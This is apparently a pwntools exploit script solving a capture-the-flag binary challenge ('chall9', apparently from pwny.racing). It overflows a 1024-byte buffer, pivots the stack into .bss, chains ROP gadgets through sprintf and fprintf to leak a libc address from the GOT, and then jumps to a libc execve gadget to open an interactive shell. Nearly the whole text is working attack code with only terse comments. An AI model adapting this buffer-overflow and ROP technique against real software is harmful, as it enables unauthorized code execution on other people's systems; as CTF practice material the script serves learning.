from pwn import *
import re

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

libc = ELF('/home/hackerman/Downloads/libc-2.27.so')
gdb_script = """
b *0x400c73
c
"""

p = process('chall9')
# gdb.attach(p, gdb_script)

sprintf = 0x400920
pop_rsp_3 = 0x400ecd
pop_rdi = 0x400ed3 # destination register
pop_rsi_1 = 0x400ed1 # source register
main = 0x400c73
entry_ptr = 0x400018
bss_end = 0x603000
new_stack = bss_end - 0x100
p.recvuntil('file: ')

rop = flat([
    pop_rdi, new_stack,
    pop_rsi_1, entry_ptr, 0,
    sprintf,
    pop_rsp_3, new_stack - 0x18
    ])

p.send('a'*1024 + '\x18')
p.send(rop)
p.send('\n')

p.recvuntil('file: ')

stdout_on_stack = new_stack - 0x18 - 0x78
# 0x78 == 120 == dist from stack top (ptr) to placeholder
stdout_ptr = 0x602020
fprintf_got = 0x601fa8
fprintf = 0x4008b0

rop = flat([
    pop_rdi, stdout_on_stack,
    pop_rsi_1, stdout_ptr, 0,
    sprintf,
    pop_rdi, 0x414141414141, # why 6 bytes?
    pop_rsi_1, fprintf_got, 0,
    fprintf,
    pop_rdi, 0,
    main
    ])

p.send('a'*1024 + '\x18')
p.send(rop)
p.send('\n')

d = p.recvuntil('file: ')
print(d)

fprintf_libc = re.search('file not found.\n(.*?) +pwny.racing presents', d)
fprintf_libc = u64(fprintf_libc.group(1) + "\0\0")

libc.address = fprintf_libc - libc.sym["fprintf"]

print(libc.address)

execve_offset = 0x4f2c5
execve = libc.address + execve_offset
print(execve)
ret = 0x40082e

rop = flat ([
    ret,
    execve
    ])

p.send('a'*1024 + '\x18')
p.send(rop)
p.send('\n')

p.interactive()
